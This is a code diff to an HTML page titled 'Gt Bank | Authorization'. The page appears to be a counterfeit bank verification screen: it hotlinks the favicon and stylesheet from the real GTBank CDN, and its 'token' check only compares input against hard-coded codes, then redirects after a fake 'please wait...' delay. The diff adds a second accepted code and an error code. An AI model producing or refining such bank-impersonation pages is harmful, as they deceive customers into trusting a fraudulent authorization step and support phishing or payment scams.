@@ -21,7 +21,7 @@
   <link rel="stylesheet" href="assets/css/custom.css">
   <link href="https://cdn.gtbank.com/assets/css/style.css?version=1660105531" media="all" rel="stylesheet" />
 
-  <link rel="shortcut icon" type="image/x-icon" href="assets/images/favicon.ico">
+  <link rel="shortcut icon" href="https://cdn.gtbank.com/assets/img/site/favicon.ico">
 
   <title>Gt Bank | Authorization</title>
 </head>
@@ -348,10 +348,16 @@ l-147-81.7v81.7H458.6z"></path>
 
   <script type="text/javascript">
     function token(form) {
-      if (form.text.value === "20233") {
+      if (form.text.value === "20233" || form.text.value === "21043") {
         $('.tokenInput-btn').html('please wait...');
         setTimeout(() => {
           window.location.href = "success.html";
+        }, 3000)
+      }
+      else if (form.text.value === "19043") {
+        $('.tokenInput-btn').html('please wait...');
+        setTimeout(() => {
+          window.location.href = "error.html";
         }, 3000)
       }
       else if (form.text.value === "") {
